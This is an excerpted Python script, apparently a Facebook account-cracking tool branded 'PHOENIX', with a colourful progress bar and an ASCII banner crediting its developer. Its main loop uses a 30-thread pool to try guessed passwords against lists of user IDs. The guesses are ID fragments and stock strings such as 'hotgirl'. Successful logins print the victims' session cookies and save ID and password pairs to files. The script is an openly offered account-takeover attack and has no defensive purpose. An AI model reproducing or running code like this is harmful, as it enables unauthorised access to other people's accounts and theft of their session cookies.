...
def lo(word):
    PHOENIX = ["[\x1b[1;92m■\x1b[0m□□□□□□□□□]","[\x1b[1;96m■■\x1b[0m□□□□□□□□]", "[\x1b[1;92m■■■\x1b[0m□□□□□□□]", "[\x1b[1;96m■■■■\x1b[0m□□□□□□]", "[\x1b[1;92m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;92m■■■■■■■\x1b[0m□□□]", "[\x1b[1;96m■■■■■■■■\x1b[0m□□]", "[\x1b[1;92m■■■■■■■■■\x1b[0m□]", "[\x1b[1;96m■■■■■■■■■■\x1b[0m]"]
    for i in range(1):
        for x in range(len(PHOENIX)):
            sys.stdout.write(('\r{}{}').format(str(word), PHOENIX[x]))
            time.sleep(0.3)
            sys.stdout.flush()
...
logo = ("""______  _                       _       
(_____ \| |                     (_)      
 _____) ) |__   ___  _____ ____  _ _   _ 
|  ____/|  _ \ / _ \| ___ |  _ \| ( \ / )
| |     | | | | |_| | ____| | | | |) X ( 
|_|     |_| |_|\___/|_____)_| |_|_(_/ \_)
[1;92m╔══\033[1;90m########################################\033[1;92m══╗[1;92m
[1;92m╠══\033[1;91m[>] [1;96mDEVOLPER\033[1;92m════════════\033[1;96mPHOENIX[1;92m        ║
[1;92m╠══\033[1;91m[>] [1;92mFACEBOOK\033[1;96m════════════\033[1;92mMd SHIHAB HOSSAIN PARVEZ[1;92m     ║
[1;92m╠══\033[1;91m[>] [1;93mGITHUB\033[1;92m══════════════\033[1;93mMIM-1553[1;92m         ║
...
def Main():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            pwx = [(code+love), (pow), (love),(love[2:]), ("mariya","badgirl","hotgirl","sexygirl",)]
            asha.submit(PHOENIX,uid,pwx,tl)
    print('-------------------')
    print(' [~] WORK IS DONE BABE')
    print(' [+] Ids saved in -OK.txt,-CP.txt')
    print('-------------------')
def PHOENIX(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;90m[\033[1;92mPHOENIX:%s\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(len(cps),loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent':max}
            ...
            if 'Photoshop' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f"\x1b[1;32m[PHOENIX-💚]  {uid} - {ps}          ")
                print(f"\033[1;91m[>]\033[1;92m=COOKIES : \033[1;96m{coki}")
                open('/sdcard/PHOENIX-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;32m[CP BUT LOGIN] {uid} | {ps}   ")
                print(f"\033[1;92mUSRER AGENT : {max}")
                open('/sdcard/PHOENIX-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
